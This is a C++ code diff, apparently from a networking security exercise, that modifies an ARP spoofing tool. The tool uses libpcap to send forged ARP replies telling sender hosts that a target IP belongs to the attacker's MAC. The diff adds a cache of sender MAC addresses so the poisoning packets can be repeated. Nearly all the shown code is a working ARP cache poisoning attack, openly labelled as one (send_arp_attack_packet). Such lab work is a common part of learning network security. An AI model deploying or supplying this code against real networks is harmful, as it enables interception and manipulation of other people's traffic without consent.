@@ -2,7 +2,7 @@
 #include <string>
 #include <sstream>
 #include <iomanip>
-#include <set>
+#include <map>
 #include <pcap.h>
 #include <ifaddrs.h>
 #include <netpacket/packet.h>
@@ -110,11 +110,18 @@ void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char*
 	Mac senderMac;
 	Ip senderIp = Ip(senderIpStr);
 	Ip targetIp = Ip(targetIpStr);
-	getMacAddrFromSendArp(handle, targetIp, myMac, senderIp, senderMac);
+
+	static map<string, Mac> senderMacSet = map<string, Mac>();
+	if (senderMacSet.find(senderIpStr) == senderMacSet.end()) {
+		// 1차 ARP Table 수정
+		getMacAddrFromSendArp(handle, targetIp, myMac, senderIp, senderMac);
+		senderMacSet[senderIpStr] = senderMac;
+	}
 	
+	// 2차 ARP Table 수정
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = senderMac;
+	packet.eth_.dmac_ = senderMacSet[senderIpStr];
 	packet.eth_.smac_ = myMac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -125,7 +132,7 @@ void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char*
 	packet.arp_.op_ = htons(ArpHdr::Reply);
 	packet.arp_.smac_ = myMac;
 	packet.arp_.sip_ = htonl(targetIp);
-	packet.arp_.tmac_ = senderMac;
+	packet.arp_.tmac_ = senderMacSet[senderIpStr];
 	packet.arp_.tip_ = htonl(senderIp);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -162,14 +169,8 @@ int main(int argc, char* argv[]) {
 	Mac myMac;
 	getMyMacAddr(dev, myMac);
 
-	set<string> senderSet = set<string>();
-
 	for (const pair<char*, char*>& pair : sender_target_pairs) {
-		if(senderSet.find(pair.first) != senderSet.end()) continue;
-		
 		send_arp_attack_packet(handle, pair.first, pair.second, myMac);
-		senderSet.insert(pair.first);
-
 		printf("Send <%s, %s>\n", pair.first, pair.second);
 	}
 	
